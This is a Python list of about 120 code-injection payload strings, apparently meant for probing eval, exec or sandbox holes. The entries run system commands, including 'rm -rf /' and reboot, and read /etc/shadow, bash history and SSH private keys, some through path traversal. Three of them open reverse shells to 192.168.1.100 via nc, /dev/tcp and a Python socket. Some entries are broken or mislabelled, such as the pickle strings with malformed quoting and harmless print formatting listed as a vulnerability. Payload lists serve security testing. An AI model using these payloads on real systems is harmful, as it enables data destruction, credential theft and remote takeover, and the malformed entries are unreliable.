pythonpayloads = [
    # OS command execution
    "os.system('cat /etc/passwd')",
    "os.system('whoami')",
    "os.system('id')",
    "os.system('rm -rf /')",
    "os.system('reboot')",
    "os.system('shutdown now')",
    "os.system('ls -la /home')",
    "os.system('ping -c 4 8.8.8.8')",
    "os.system('curl http://example.com')",
    "os.system('wget http://example.com')",
    
    # Eval and Exec function execution
    "eval('__import__(\"os\").system(\"ls\")')",
    "eval('os.system(\"id\")')",
    "eval('subprocess.call([\"ls\", \"-la\"])')",
    "eval('print(__import__(\"os\").system(\"whoami\"))')",
    "exec('os.system(\"uname -a\")')",
    "exec('subprocess.call([\"whoami\"])')",
    "eval('open(\"/etc/shadow\", \"r\").read()')",
    
    # Subprocess execution
    "subprocess.run(['ls', '-la'])",
    "subprocess.run(['id'])",
    "subprocess.Popen('whoami', shell=True)",
    "subprocess.call(['uname', '-a'])",
    "subprocess.run(['ping', '-c', '4', '8.8.8.8'])",
    "subprocess.Popen('cat /etc/passwd', shell=True)",
    "subprocess.run(['curl', 'http://example.com'])",
    "subprocess.Popen('reboot', shell=True)",
    
    # Accessing sensitive files
    "open('/etc/shadow', 'r').read()",
    "open('/var/log/syslog', 'r').read()",
    "open('/root/.bash_history', 'r').read()",
    "open('/home/user/.ssh/id_rsa', 'r').read()",
    "open('/etc/hosts', 'r').read()",
    "open('/etc/crontab', 'r').read()",
    "open('/etc/group', 'r').read()",
    
    # Arbitrary code execution via imports
    "__import__('subprocess').run(['ls', '-la'])",
    "__import__('os').popen('ls -la').read()",
    "__import__('os').system('id')",
    "__import__('subprocess').Popen('whoami', shell=True)",
    "__import__('os').system('reboot')",
    "__import__('os').system('ping -c 4 8.8.8.8')",
    "__import__('subprocess').call(['uname', '-a'])",
    
    # Using compile function
    "compile('print(1+1)', '', 'exec')",
    "compile('__import__(\"os\").system(\"ls\")', '', 'exec')",
    "compile('os.system(\"id\")', '', 'exec')",
    "compile('subprocess.run([\"ls\", \"-la\"])', '', 'exec')",
    "compile('os.system(\"whoami\")', '', 'exec')",
    
    # Environment manipulation
    "os.getenv('HOME')",
    "os.getenv('PATH')",
    "os.getenv('SHELL')",
    "os.getenv('USER')",
    "os.getenv('LOGNAME')",
    "os.getenv('HOSTNAME')",
    "os.getenv('PWD')",
    "os.getenv('LANG')",
    
    # Arbitrary file reading
    "open('/etc/issue').read()",
    "open('/var/log/dmesg').read()",
    "open('/etc/motd').read()",
    "open('/proc/meminfo').read()",
    "open('/proc/cpuinfo').read()",
    "open('/etc/fstab').read()",
    
    # Arbitrary command execution via various libraries
    "subprocess.run(['df', '-h'])",
    "subprocess.Popen('free -m', shell=True)",
    "subprocess.call(['ps', 'aux'])",
    "subprocess.Popen('top -n 1', shell=True)",
    "os.system('df -h')",
    "os.system('free -m')",
    "os.system('ps aux')",
    "os.system('top -n 1')",
    
    # Dangerous eval/exec payloads
    "eval('import os; os.system(\"ls\")')",
    "eval('import subprocess; subprocess.run([\"ls\", \"-la\"])')",
    "eval('open(\"/etc/passwd\").read()')",
    "exec('import os; os.system(\"ls\")')",
    "exec('open(\"/etc/shadow\").read()')",
    "eval('import sys; sys.exit()')",
    
    # Python-specific built-in functions exploitation
    "eval('dir()')",
    "eval('locals()')",
    "eval('globals()')",
    "eval('vars()')",
    "eval('type(1)')",
    "eval('help()')",
    "eval('execfile(\"/etc/passwd\")')",
    
    # Arbitrary code via pickle module
    "import pickle; pickle.loads(b'cos\nsystem\n(S'ls'\ntR.')')",
    "import pickle; pickle.loads(b'cos\nsystem\n(S'id'\ntR.')')",
    "import pickle; pickle.loads(b'cos\npopen\n(S'cat /etc/passwd'\ntR.')')",
    
    # Arbitrary code via marshal module
    "import marshal; marshal.loads(b'c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00')",
    "import marshal; marshal.dumps(eval)",
    
    # Arbitrary code via base64 module
    "import base64; base64.b64decode(b'Y29zCnN5c3RlbQpTJ2xzJwp0Ug==')",
    "import base64; base64.b64decode(b'c3lzdGVtKCdscycpCg==')",
    
    # String formatting vulnerabilities
    "print('%x' % (42))",
    "print('%s' % ('Hello'))",
    "print('{}{}'.format('foo', 'bar'))",
    "print(f'{os.system(\"ls\")}')",
    
    # Command substitution via os.popen
    "os.popen('ls').read()",
    "os.popen('whoami').read()",
    "os.popen('cat /etc/passwd').read()",
    "os.popen('reboot').read()",
    "os.popen('ping -c 4 8.8.8.8').read()",
    
    # Accessing arbitrary attributes
    "getattr(os, 'system')('ls')",
    "getattr(subprocess, 'run')(['ls', '-la'])",
    "getattr(__import__('os'), 'system')('whoami')",
    
    # Path traversal attempts
    "open('../../../../etc/passwd', 'r').read()",
    "open('/../../../../home/user/.bash_history', 'r').read()",
    "open('/../../../../root/.ssh/id_rsa', 'r').read()",
    "open('/../../../../var/log/auth.log', 'r').read()",
    
    # Reverse shell attempts
    "os.system('nc -e /bin/bash 192.168.1.100 4444')",
    "os.system('bash -i >& /dev/tcp/192.168.1.100/4444 0>&1')",
    "os.system('python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"192.168.1.100\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"])\"')",
    
    # Arbitrary command execution via execfile
    "execfile('/etc/passwd')",
    "execfile('/root/.bash_history')",
    "execfile('/etc/shadow')"
]
